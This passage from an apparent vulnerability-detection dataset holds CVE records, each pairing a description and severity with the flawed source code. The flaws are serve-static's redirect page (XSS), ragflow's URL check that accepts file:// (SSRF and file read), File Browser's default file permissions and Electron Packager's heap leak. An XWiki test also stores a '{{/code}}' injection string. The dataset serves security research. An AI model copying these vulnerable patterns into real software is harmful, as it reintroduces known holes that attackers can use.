    "cve": "CVE-2024-43800",
    "description": "serve-static serves static files. serve-static passes untrusted user input - even after sanitizing it - to redirect() may execute untrusted code. This issue is patched in serve-static 1.16.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "index.js",
          "content": "/*!\n * serve-static\n * Copyright(c) 2010 Sencha Inc.\n * Copyright(c) 2011 TJ Holowaychuk\n * Copyright(c) 2014-2016 Douglas Christopher Wilson\n * MIT Licensed\n */\n\n'use strict'\n\n/**\n * Module dependencies.\n * @private\n */\n\nvar encodeUrl = require('encodeurl')\nvar escapeHtml = require('escape-html')\nvar parseUrl = require('parseurl')\nvar resolve = require('path').resolve\nvar send = require('send')\nvar url = require('url')\n\n/**\n * Module exports.\n * @public\n */\n\nmodule.exports = serveStatic\nmodule.exports.mime = send.mime\n\n/**\n * @param {string} root\n * @param {object} [options]\n * @return {function}\n * @public\n */\n\nfunction serveStatic (root, options) {\n  if (!root) {\n    throw new TypeError('root path required')\n  }\n\n  if (typeof root !== 'string') {\n    throw new TypeError('root path must be a string')\n  }\n\n  // copy options object\n  var opts = Object.create(options || null)\n\n  // fall-though\n  var fallthrough = opts.fallthrough !== false\n\n  // default redirect\n  var redirect = opts.redirect !== false\n\n  // headers listener\n  var setHeaders = opts.setHeaders\n\n  if (setHeaders && typeof setHeaders !== 'function') {\n    throw new TypeError('option setHeaders must be function')\n  }\n\n  // setup options for send\n  opts.maxage = opts.maxage || opts.maxAge || 0\n  opts.root = resolve(root)\n\n  // construct directory listener\n  var onDirectory = redirect\n    ? createRedirectDirectoryListener()\n    : createNotFoundDirectoryListener()\n\n  return function serveStatic (req, res, next) {\n    if (req.method !== 'GET' && req.method !== 'HEAD') {\n      if (fallthrough) {\n        return next()\n      }\n\n      // method not allowed\n      res.statusCode = 405\n      res.setHeader('Allow', 'GET, HEAD')\n      res.setHeader('Content-Length', '0')\n      res.end()\n      return\n    }\n\n    var forwardError = !fallthrough\n    var originalUrl = parseUrl.original(req)\n    var path = parseUrl(req).pathname\n\n    // make sure redirect occurs at mount\n    if (path === '/' && originalUrl.pathname.substr(-1) !== '/') {\n      path = ''\n    }\n\n    // create send stream\n    var stream = send(req, path, opts)\n\n    // add directory handler\n    stream.on('directory', onDirectory)\n\n    // add headers listener\n    if (setHeaders) {\n      stream.on('headers', setHeaders)\n    }\n\n    // add file listener for fallthrough\n    if (fallthrough) {\n      stream.on('file', function onFile () {\n        // once file is determined, always forward error\n        forwardError = true\n      })\n    }\n\n    // forward errors\n    stream.on('error', function error (err) {\n      if (forwardError || !(err.statusCode < 500)) {\n        next(err)\n        return\n      }\n\n      next()\n    })\n\n    // pipe\n    stream.pipe(res)\n  }\n}\n\n/**\n * Collapse all leading slashes into a single slash\n * @private\n */\nfunction collapseLeadingSlashes (str) {\n  for (var i = 0; i < str.length; i++) {\n    if (str.charCodeAt(i) !== 0x2f /* / */) {\n      break\n    }\n  }\n\n  return i > 1\n    ? '/' + str.substr(i)\n    : str\n}\n\n/**\n * Create a minimal HTML document.\n *\n * @param {string} title\n * @param {string} body\n * @private\n */\n\nfunction createHtmlDocument (title, body) {\n  return '<!DOCTYPE html>\\n' +\n    '<html lang=\"en\">\\n' +\n    '<head>\\n' +\n    '<meta charset=\"utf-8\">\\n' +\n    '<title>' + title + '</title>\\n' +\n    '</head>\\n' +\n    '<body>\\n' +\n    '<pre>' + body + '</pre>\\n' +\n    '</body>\\n' +\n    '</html>\\n'\n}\n\n/**\n * Create a directory listener that just 404s.\n * @private\n */\n\nfunction createNotFoundDirectoryListener () {\n  return function notFound () {\n    this.error(404)\n  }\n}\n\n/**\n * Create a directory listener that performs a redirect.\n * @private\n */\n\nfunction createRedirectDirectoryListener () {\n  return function redirect (res) {\n    if (this.hasTrailingSlash()) {\n      this.error(404)\n      return\n    }\n\n    // get original URL\n    var originalUrl = parseUrl.original(this.req)\n\n    // append trailing slash\n    originalUrl.path = null\n    originalUrl.pathname = collapseLeadingSlashes(originalUrl.pathname + '/')\n\n    // reformat the URL\n    var loc = encodeUrl(url.format(originalUrl))\n    var doc = createHtmlDocument('Redirecting', 'Redirecting to <a href=\"' + escapeHtml(loc) + '\">' +\n      escapeHtml(loc) + '</a>')\n\n    // send redirect response\n    res.statusCode = 301\n    res.setHeader('Content-Type', 'text/html; charset=UTF-8')\n    res.setHeader('Content-Length', Buffer.byteLength(doc))\n    res.setHeader('Content-Security-Policy', \"default-src 'none'\")\n    res.setHeader('X-Content-Type-Options', 'nosniff')\n    res.setHeader('Location', loc)\n    res.end(doc)\n  }\n}\n"
        }
      ],
      "method_level": [
        "function createRedirectDirectoryListener () {\n  return function redirect (res) {\n    if (this.hasTrailingSlash()) {\n      this.error(404)\n      return\n    }\n\n    // get original URL\n    var originalUrl = parseUrl.original(this.req)\n\n    // append trailing slash\n    originalUrl.path = null\n    originalUrl.pathname = collapseLeadingSlashes(originalUrl.pathname + '/')\n\n    // reformat the URL\n    var loc = encodeUrl(url.format(originalUrl))\n    var doc = createHtmlDocument('Redirecting', 'Redirecting to <a href=\"' + escapeHtml(loc) + '\">' +\n      escapeHtml(loc) + '</a>')\n\n    // send redirect response\n    res.statusCode = 301\n    res.setHeader('Content-Type', 'text/html; charset=UTF-8')\n    res.setHeader('Content-Length', Buffer.byteLength(doc))\n    res.setHeader('Content-Security-Policy', \"default-src 'none'\")\n    res.setHeader('X-Content-Type-Options', 'nosniff')\n    res.setHeader('Location', loc)\n    res.end(doc)\n  }\n}"
      ],
      "hunk_level": [
        {
          "line_no": 198,
          "content": "    var doc = createHtmlDocument('Redirecting', 'Redirecting to <a href=\"' + escapeHtml(loc) + '\">' +"
        },
        {
          "line_no": 199,
          "content": "      escapeHtml(loc) + '</a>')"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.0,
    "cvss_version": 3.1
  },
  {
    "id": 1398,
    "cve": "CVE-2024-12450",
    "description": "In infiniflow/ragflow versions 0.12.0, the `web_crawl` function in `document_app.py` contains multiple vulnerabilities. The function does not filter URL parameters, allowing attackers to exploit Full Read SSRF by accessing internal network addresses and viewing their content through the generated PDF files. Additionally, the lack of restrictions on the file protocol enables Arbitrary File Read, allowing attackers to read server files. Furthermore, the use of an outdated Chromium headless version with --no-sandbox mode enabled makes the application susceptible to Remote Code Execution (RCE) via known Chromium v8 vulnerabilities. These issues are resolved in version 0.14.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "api/utils/web_utils.py",
          "content": "import re\nimport json\nimport base64\n\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nfrom selenium.webdriver.chrome.service import Service\nfrom selenium.common.exceptions import TimeoutException\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support.expected_conditions import staleness_of\nfrom webdriver_manager.chrome import ChromeDriverManager\nfrom selenium.webdriver.common.by import By\n\n\ndef html2pdf(\n        source: str,\n        timeout: int = 2,\n        install_driver: bool = True,\n        print_options: dict = {},\n):\n    result = __get_pdf_from_html(source, timeout, install_driver, print_options)\n    return result\n\n\ndef __send_devtools(driver, cmd, params={}):\n    resource = \"/session/%s/chromium/send_command_and_get_result\" % driver.session_id\n    url = driver.command_executor._url + resource\n    body = json.dumps({\"cmd\": cmd, \"params\": params})\n    response = driver.command_executor._request(\"POST\", url, body)\n\n    if not response:\n        raise Exception(response.get(\"value\"))\n\n    return response.get(\"value\")\n\n\ndef __get_pdf_from_html(\n        path: str,\n        timeout: int,\n        install_driver: bool,\n        print_options: dict\n):\n    webdriver_options = Options()\n    webdriver_prefs = {}\n    webdriver_options.add_argument(\"--headless\")\n    webdriver_options.add_argument(\"--disable-gpu\")\n    webdriver_options.add_argument(\"--no-sandbox\")\n    webdriver_options.add_argument(\"--disable-dev-shm-usage\")\n    webdriver_options.experimental_options[\"prefs\"] = webdriver_prefs\n\n    webdriver_prefs[\"profile.default_content_settings\"] = {\"images\": 2}\n\n    if install_driver:\n        service = Service(ChromeDriverManager().install())\n        driver = webdriver.Chrome(service=service, options=webdriver_options)\n    else:\n        driver = webdriver.Chrome(options=webdriver_options)\n\n    driver.get(path)\n\n    try:\n        WebDriverWait(driver, timeout).until(\n            staleness_of(driver.find_element(by=By.TAG_NAME, value=\"html\"))\n        )\n    except TimeoutException:\n        calculated_print_options = {\n            \"landscape\": False,\n            \"displayHeaderFooter\": False,\n            \"printBackground\": True,\n            \"preferCSSPageSize\": True,\n        }\n        calculated_print_options.update(print_options)\n        result = __send_devtools(\n            driver, \"Page.printToPDF\", calculated_print_options)\n        driver.quit()\n        return base64.b64decode(result[\"data\"])\n\n\ndef is_valid_url(url: str) -> bool:\n    return bool(re.match(r\"(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]\", url))\n"
        }
      ],
      "method_level": [
        "def is_valid_url(url: str) -> bool:\n    return bool(re.match(r\"(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]\", url))"
      ],
      "hunk_level": [
        {
          "line_no": 80,
          "content": "    return bool(re.match(r\"(https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]\", url))"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 193,
    "cve": "CVE-2025-52900",
    "description": "File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. The file access permissions for files uploaded to or created from File Browser are never explicitly set by the application. The same is true for the database used by File Browser. On standard servers using File Browser prior to version 2.33.7 where the umask configuration has not been hardened before, this makes all the stated files readable by any operating system account. Version 2.33.7 fixes the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "cmd/utils.go",
          "content": "package cmd\n\nimport (\n\t\"encoding/json\"\n\t\"errors\"\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n\n\t\"github.com/asdine/storm/v3\"\n\t\"github.com/spf13/cobra\"\n\t\"github.com/spf13/pflag\"\n\tyaml \"gopkg.in/yaml.v2\"\n\n\t\"github.com/filebrowser/filebrowser/v2/settings\"\n\t\"github.com/filebrowser/filebrowser/v2/storage\"\n\t\"github.com/filebrowser/filebrowser/v2/storage/bolt\"\n)\n\nfunc checkErr(err error) {\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n\nfunc mustGetString(flags *pflag.FlagSet, flag string) string {\n\ts, err := flags.GetString(flag)\n\tcheckErr(err)\n\treturn s\n}\n\nfunc mustGetBool(flags *pflag.FlagSet, flag string) bool {\n\tb, err := flags.GetBool(flag)\n\tcheckErr(err)\n\treturn b\n}\n\nfunc mustGetUint(flags *pflag.FlagSet, flag string) uint {\n\tb, err := flags.GetUint(flag)\n\tcheckErr(err)\n\treturn b\n}\n\nfunc generateKey() []byte {\n\tk, err := settings.GenerateKey()\n\tcheckErr(err)\n\treturn k\n}\n\ntype cobraFunc func(cmd *cobra.Command, args []string)\ntype pythonFunc func(cmd *cobra.Command, args []string, data pythonData)\n\ntype pythonConfig struct {\n\tnoDB      bool\n\tallowNoDB bool\n}\n\ntype pythonData struct {\n\thadDB bool\n\tstore *storage.Storage\n}\n\nfunc dbExists(path string) (bool, error) {\n\tstat, err := os.Stat(path)\n\tif err == nil {\n\t\treturn stat.Size() != 0, nil\n\t}\n\n\tif os.IsNotExist(err) {\n\t\td := filepath.Dir(path)\n\t\t_, err = os.Stat(d)\n\t\tif os.IsNotExist(err) {\n\t\t\tif err := os.MkdirAll(d, 0700); err != nil { //nolint:govet,gomnd\n\t\t\t\treturn false, err\n\t\t\t}\n\t\t\treturn false, nil\n\t\t}\n\t}\n\n\treturn false, err\n}\n\nfunc python(fn pythonFunc, cfg pythonConfig) cobraFunc {\n\treturn func(cmd *cobra.Command, args []string) {\n\t\tdata := pythonData{hadDB: true}\n\n\t\tpath := getStringParam(cmd.Flags(), \"database\")\n\t\tabsPath, err := filepath.Abs(path)\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\texists, err := dbExists(path)\n\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t} else if exists && cfg.noDB {\n\t\t\tlog.Fatal(absPath + \" already exists\")\n\t\t} else if !exists && !cfg.noDB && !cfg.allowNoDB {\n\t\t\tlog.Fatal(absPath + \" does not exist. Please run 'filebrowser config init' first.\")\n\t\t} else if !exists && !cfg.noDB {\n\t\t\tlog.Println(\"Warning: filebrowser.db can't be found. Initialing in \" + strings.TrimSuffix(absPath, \"filebrowser.db\"))\n\t\t}\n\n\t\tlog.Println(\"Using database: \" + absPath)\n\t\tdata.hadDB = exists\n\t\tdb, err := storm.Open(path)\n\t\tcheckErr(err)\n\t\tdefer db.Close()\n\t\tdata.store, err = bolt.NewStorage(db)\n\t\tcheckErr(err)\n\t\tfn(cmd, args, data)\n\t}\n}\n\nfunc marshal(filename string, data interface{}) error {\n\tfd, err := os.Create(filename)\n\tcheckErr(err)\n\tdefer fd.Close()\n\n\tswitch ext := filepath.Ext(filename); ext {\n\tcase \".json\":\n\t\tencoder := json.NewEncoder(fd)\n\t\tencoder.SetIndent(\"\", \"    \")\n\t\treturn encoder.Encode(data)\n\tcase \".yml\", \".yaml\": //nolint:goconst\n\t\tencoder := yaml.NewEncoder(fd)\n\t\treturn encoder.Encode(data)\n\tdefault:\n\t\treturn errors.New(\"invalid format: \" + ext)\n\t}\n}\n\nfunc unmarshal(filename string, data interface{}) error {\n\tfd, err := os.Open(filename)\n\tcheckErr(err)\n\tdefer fd.Close()\n\n\tswitch ext := filepath.Ext(filename); ext {\n\tcase \".json\":\n\t\treturn json.NewDecoder(fd).Decode(data)\n\tcase \".yml\", \".yaml\":\n\t\treturn yaml.NewDecoder(fd).Decode(data)\n\tdefault:\n\t\treturn errors.New(\"invalid format: \" + ext)\n\t}\n}\n\nfunc jsonYamlArg(cmd *cobra.Command, args []string) error {\n\tif err := cobra.ExactArgs(1)(cmd, args); err != nil {\n\t\treturn err\n\t}\n\n\tswitch ext := filepath.Ext(args[0]); ext {\n\tcase \".json\", \".yml\", \".yaml\":\n\t\treturn nil\n\tdefault:\n\t\treturn errors.New(\"invalid format: \" + ext)\n\t}\n}\n\nfunc cleanUpInterfaceMap(in map[interface{}]interface{}) map[string]interface{} {\n\tresult := make(map[string]interface{})\n\tfor k, v := range in {\n\t\tresult[fmt.Sprintf(\"%v\", k)] = cleanUpMapValue(v)\n\t}\n\treturn result\n}\n\nfunc cleanUpInterfaceArray(in []interface{}) []interface{} {\n\tresult := make([]interface{}, len(in))\n\tfor i, v := range in {\n\t\tresult[i] = cleanUpMapValue(v)\n\t}\n\treturn result\n}\n\nfunc cleanUpMapValue(v interface{}) interface{} {\n\tswitch v := v.(type) {\n\tcase []interface{}:\n\t\treturn cleanUpInterfaceArray(v)\n\tcase map[interface{}]interface{}:\n\t\treturn cleanUpInterfaceMap(v)\n\tdefault:\n\t\treturn v\n\t}\n}\n\n// convertCmdStrToCmdArray checks if cmd string is blank (whitespace included)\n// then returns empty string array, else returns the split word array of cmd.\n// This is to ensure the result will never be []string{\"\"}\nfunc convertCmdStrToCmdArray(cmd string) []string {\n\tvar cmdArray []string\n\ttrimmedCmdStr := strings.TrimSpace(cmd)\n\tif trimmedCmdStr != \"\" {\n\t\tcmdArray = strings.Split(trimmedCmdStr, \" \")\n\t}\n\treturn cmdArray\n}\n"
        }
      ],
      "method_level": [
        "func python(fn pythonFunc, cfg pythonConfig) cobraFunc {\n\treturn func(cmd *cobra.Command, args []string) {\n\t\tdata := pythonData{hadDB: true}\n\n\t\tpath := getStringParam(cmd.Flags(), \"database\")\n\t\tabsPath, err := filepath.Abs(path)\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t\texists, err := dbExists(path)\n\n\t\tif err != nil {\n\t\t\tpanic(err)\n\t\t} else if exists && cfg.noDB {\n\t\t\tlog.Fatal(absPath + \" already exists\")\n\t\t} else if !exists && !cfg.noDB && !cfg.allowNoDB {\n\t\t\tlog.Fatal(absPath + \" does not exist. Please run 'filebrowser config init' first.\")\n\t\t} else if !exists && !cfg.noDB {\n\t\t\tlog.Println(\"Warning: filebrowser.db can't be found. Initialing in \" + strings.TrimSuffix(absPath, \"filebrowser.db\"))\n\t\t}\n\n\t\tlog.Println(\"Using database: \" + absPath)\n\t\tdata.hadDB = exists\n\t\tdb, err := storm.Open(path)\n\t\tcheckErr(err)\n\t\tdefer db.Close()\n\t\tdata.store, err = bolt.NewStorage(db)\n\t\tcheckErr(err)\n\t\tfn(cmd, args, data)\n\t}\n}"
      ],
      "hunk_level": [
        {
          "line_no": 108,
          "content": "\t\tdb, err := storm.Open(path)"
        }
      ]
    },
    "cwe": [
      "CWE-276"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.5,
    "cvss_version": 3.1
  },
  {
    "id": 531,
    "cve": "CVE-2024-29900",
    "description": "Electron Packager bundles Electron-based application source code with a renamed Electron executable and supporting files into folders ready for distribution. A random segment of ~1-10kb of Node.js heap memory allocated either side of a known buffer will be leaked into the final executable. This memory _could_ contain sensitive information such as environment variables, secrets files, etc. This issue is patched in 18.3.1.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/resedit.ts",
          "content": "import * as fs from 'fs-extra';\n// eslint-disable-next-line import/no-unresolved\nimport { load as loadResEdit } from 'resedit/cjs';\nimport { Win32MetadataOptions } from './types';\nimport { FileRecord } from '@electron/asar';\n\nexport type ExeMetadata = {\n  productVersion?: string;\n  fileVersion?: string;\n  legalCopyright?: string;\n  productName?: string;\n  iconPath?: string;\n  asarIntegrity?: Record<string, Pick<FileRecord['integrity'], 'algorithm' | 'hash'>>;\n  win32Metadata?: Win32MetadataOptions;\n}\n\ntype ParsedVersionNumerics = [number, number, number, number];\n\n/**\n * Parse a version string in the format a.b.c.d with each component being optional\n * but if present must be an integer. Matches the impl in rcedit for compat\n */\nfunction parseVersionString(str: string): ParsedVersionNumerics {\n  const parts = str.split('.');\n  if (parts.length === 0 || parts.length > 4) {\n    throw new Error(`Incorrectly formatted version string: \"${str}\". Should have at least one and at most four components`);\n  }\n  return parts.map((part) => {\n    const parsed = parseInt(part, 10);\n    if (isNaN(parsed)) {\n      throw new Error(`Incorrectly formatted version string: \"${str}\". Component \"${part}\" could not be parsed as an integer`);\n    }\n    return parsed;\n  }) as ParsedVersionNumerics;\n}\n\n// Ref: https://learn.microsoft.com/en-us/windows/win32/menurc/resource-types\nconst RT_MANIFEST_TYPE = 24;\n\nexport async function resedit(exePath: string, options: ExeMetadata) {\n  const resedit = await loadResEdit();\n\n  const exeData = await fs.readFile(exePath);\n  const exe = resedit.NtExecutable.from(exeData);\n  const res = resedit.NtExecutableResource.from(exe);\n\n  if (options.iconPath) {\n    // Icon Info\n    const existingIconGroups = resedit.Resource.IconGroupEntry.fromEntries(res.entries);\n    if (existingIconGroups.length !== 1) {\n      throw new Error('Failed to parse win32 executable resources, failed to locate existing icon group');\n    }\n    const iconFile = resedit.Data.IconFile.from(await fs.readFile(options.iconPath));\n    resedit.Resource.IconGroupEntry.replaceIconsForResource(\n      res.entries,\n      existingIconGroups[0].id,\n      existingIconGroups[0].lang,\n      iconFile.icons.map((item) => item.data)\n    );\n  }\n\n  // Manifest\n  if (options.win32Metadata?.['application-manifest'] || options.win32Metadata?.['requested-execution-level']) {\n    if (options.win32Metadata?.['application-manifest'] && options.win32Metadata?.['requested-execution-level']) {\n      throw new Error('application-manifest and requested-execution-level are mutually exclusive, only provide one');\n    }\n\n    const manifests = res.entries.filter(e => e.type === RT_MANIFEST_TYPE);\n    if (manifests.length !== 1) {\n      throw new Error('Failed to parse win32 executable resources, failed to locate existing manifest');\n    }\n    const manifestEntry = manifests[0];\n    if (options.win32Metadata?.['application-manifest']) {\n      manifestEntry.bin = (await fs.readFile(options.win32Metadata?.['application-manifest'])).buffer;\n    } else if (options.win32Metadata?.['requested-execution-level']) {\n      // This implementation matches what rcedit used to do, in theory we can be Smarter\n      // and use an actual XML parser, but for now let's match the old impl\n      const currentManifestContent = Buffer.from(manifestEntry.bin).toString('utf-8');\n      const newContent = currentManifestContent.replace(\n        /(<requestedExecutionLevel level=\")asInvoker(\" uiAccess=\"false\"\\/>)/g,\n        `$1${options.win32Metadata?.['requested-execution-level']}$2`\n      );\n      manifestEntry.bin = Buffer.from(newContent, 'utf-8');\n    }\n  }\n\n  // Version Info\n  const versionInfo = resedit.Resource.VersionInfo.fromEntries(res.entries);\n  if (versionInfo.length !== 1) {\n    throw new Error('Failed to parse win32 executable resources, failed to locate existing version info');\n  }\n  if (options.fileVersion) versionInfo[0].setFileVersion(...parseVersionString(options.fileVersion));\n  if (options.productVersion) versionInfo[0].setProductVersion(...parseVersionString(options.productVersion));\n  const languageInfo = versionInfo[0].getAllLanguagesForStringValues();\n  if (languageInfo.length !== 1) {\n    throw new Error('Failed to parse win32 executable resources, failed to locate existing language info');\n  }\n  // Empty strings retain original value\n  const newStrings: Record<string, string> = {\n    CompanyName: options.win32Metadata?.CompanyName || '',\n    FileDescription: options.win32Metadata?.FileDescription || '',\n    FileVersion: options.fileVersion || '',\n    InternalName: options.win32Metadata?.InternalName || '',\n    LegalCopyright: options.legalCopyright || '',\n    OriginalFilename: options.win32Metadata?.OriginalFilename || '',\n    ProductName: options.productName || '',\n    ProductVersion: options.productVersion || '',\n  };\n  for (const key of Object.keys(newStrings)) {\n    if (!newStrings[key]) delete newStrings[key];\n  }\n  versionInfo[0].setStringValues(languageInfo[0], newStrings);\n\n  // Output version info\n  versionInfo[0].outputToResourceEntries(res.entries);\n\n  // Asar Integrity\n  if (options.asarIntegrity) {\n    res.entries.push({\n      type: 'Integrity',\n      id: 'ElectronAsar',\n      bin: Buffer.from(JSON.stringify(options.asarIntegrity)).buffer,\n      lang: languageInfo[0].lang,\n      codepage: languageInfo[0].codepage,\n    });\n  }\n\n  res.outputResource(exe);\n\n  await fs.writeFile(exePath, Buffer.from(exe.generate()));\n}\n"
        }
      ],
      "method_level": [
        "resedit"
      ],
      "hunk_level": [
        {
          "line_no": 120,
          "content": "      type: 'Integrity',"
        },
        {
          "line_no": 121,
          "content": "      id: 'ElectronAsar',"
        },
        {
          "line_no": 122,
          "content": "      bin: Buffer.from(JSON.stringify(options.asarIntegrity)).buffer,"
        }
      ]
    },
    "cwe": [
      "CWE-402"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 622,
    "cve": "CVE-2024-31986",
    "description": "XWiki Platform is a generic wiki platform. Starting in version 3.1 and prior to versions 4.10.19, 15.5.4, and 15.10-rc-1, by creating a document with a special crafted documented reference and an `XWiki.SchedulerJobClass` XObject, it is possible to execute arbitrary code on the server whenever an admin visits the scheduler page or the scheduler page is referenced, e.g., via an image in a comment on a page in the wiki. The vulnerability has been fixed in XWiki 14.10.19, 15.5.5, and 15.9. As a workaround, apply the patch manually by modifying the `Scheduler.WebHome` page.",
    "vulnerability": {
      "file_level": [
        {
          "name": "xwiki-platform-core/xwiki-platform-scheduler/xwiki-platform-scheduler-test/xwiki-platform-scheduler-test-docker/src/test/it/org/xwiki/scheduler/test/ui/SchedulerIT.java",
          "content": "/*\n * See the NOTICE file distributed with this work for additional\n * information regarding copyright ownership.\n *\n * This is free software; you can redistribute it and/or modify it\n * under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation; either version 2.1 of\n * the License, or (at your option) any later version.\n *\n * This software is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this software; if not, write to the Free\n * Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n * 02110-1301 USA, or see the FSF site: http://www.fsf.org.\n */\npackage org.xwiki.scheduler.test.ui;\n\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.openqa.selenium.By;\nimport org.xwiki.scheduler.test.po.SchedulerHomePage;\nimport org.xwiki.scheduler.test.po.SchedulerPage;\nimport org.xwiki.scheduler.test.po.editor.SchedulerEditPage;\nimport org.xwiki.test.docker.junit5.UITest;\nimport org.xwiki.test.ui.TestUtils;\n\nimport static org.junit.jupiter.api.Assertions.assertEquals;\nimport static org.junit.jupiter.api.Assertions.assertFalse;\nimport static org.junit.jupiter.api.Assertions.fail;\n\n/**\n * Tests Scheduler application features.\n *\n * @version $Id$\n */\n@UITest(\n    properties = {\n        // The scheduler UI need programming right\n        \"xwikiPropertiesAdditionalProperties=test.prchecker.excludePattern=xwiki:Scheduler\\\\.WebHome\",\n\n        // Override in order to add the Scheduler Plugin\n        \"xwikiCfgPlugins=com.xpn.xwiki.plugin.skinx.JsSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.JsSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.CssSkinFileExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.skinx.LinkExtensionPlugin,\"\n            + \"com.xpn.xwiki.plugin.scheduler.SchedulerPlugin\"\n    },\n    extraJARs = {\n        // The Scheduler plugin needs to be in WEB-INF/lib since it's defined in xwiki.cfg and plugins are loaded\n        // by XWiki at startup, i.e. before extensions are provisioned for the tests\n        \"org.xwiki.platform:xwiki-platform-scheduler-api\",\n        // Because of https://jira.xwiki.org/browse/XWIKI-17972 we need to install the jython jar manually in\n        // WEB-INF/lib.\n        \"org.python:jython-slim:2.7.3\"\n})\nclass SchedulerIT\n{\n    @Test\n    @Order(1)\n    void verifyScheduler(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        // Make sure the job doesn't exist. Note that we don't delete the job after the test is executed (@After)\n        // because we want to remain on the same page in case of a test failure so that our TestDebugger rule can\n        // collect accurate information about the failure. It's not a problem if the job remains scheduled because it\n        // does nothing. Other tests should not rely on the number of scheduler jobs though.\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        String jobName = \"Tester problem\";\n        schedulerEdit.setJobName(jobName);\n        schedulerEdit.setJobDescription(jobName);\n        schedulerEdit.setCron(\"0 15 10 ? * MON-FRI\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // View Job\n        schedulerPage = schedulerHomePage.clickJobActionView(jobName);\n\n        // Tests that a scheduler job page's default edit mode is Form\n        // Note: This line below will fail if the page is not edited in Form mode!\n        schedulerPage.edit();\n        new SchedulerEditPage().setJobDescription(\"test\");\n        schedulerEdit.clickCancel();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Edit Job\n        schedulerEdit = schedulerHomePage.clickJobActionEdit(jobName);\n        schedulerEdit.setJobDescription(\"Tester problem2\");\n        schedulerEdit.setCron(\"0 0/5 14 * * ?\");\n        schedulerPage = schedulerEdit.clickSaveAndView();\n        schedulerHomePage = schedulerPage.backToHome();\n\n        // Delete and Restore Job\n        schedulerHomePage.clickJobActionDelete(jobName).clickYes();\n        schedulerHomePage = SchedulerHomePage.gotoPage();\n        assertFalse(setup.getDriver().hasElementWithoutWaiting(By.linkText(jobName)));\n        // Note: since the page doesn't exist, we need to disable the space redirect feature so that we end up on the\n        // terminal page that was removed.\n        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");\n        setup.getDriver().findElement(By.linkText(\"Restore\")).click();\n        schedulerPage = new SchedulerPage();\n        schedulerPage.backToHome();\n\n        // Schedule Job\n        schedulerHomePage.clickJobActionSchedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to schedule job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Trigger Job (a Job can only be triggered after it's been scheduled)\n        schedulerHomePage.clickJobActionTrigger(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to trigger job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Pause Job\n        schedulerHomePage.clickJobActionPause(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to pause job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Resume Job\n        schedulerHomePage.clickJobActionResume(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to resume job. Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n\n        // Unschedule Job\n        schedulerHomePage.clickJobActionUnschedule(jobName);\n        if (schedulerHomePage.hasError()) {\n            fail(\"Failed to unschedule job.  Error [\" + schedulerHomePage.getErrorMessage() + \"]\");\n        }\n    }\n\n    @Test\n    @Order(2)\n    void verifyEscaping(TestUtils setup)\n    {\n        setup.loginAsSuperAdmin();\n\n        setup.deletePage(\"Scheduler\", \"SchedulerTestJob\");\n\n        // Create Job\n        SchedulerHomePage schedulerHomePage = SchedulerHomePage.gotoPage();\n        schedulerHomePage.setJobName(\"SchedulerTestJob\");\n        SchedulerEditPage schedulerEdit = schedulerHomePage.clickAdd();\n\n        schedulerEdit.setScript(\"{{/code}}\");\n        SchedulerPage schedulerPage = schedulerEdit.clickSaveAndView();\n\n        assertEquals(\"{{/code}}\", schedulerPage.getScript());\n    }\n}\n"
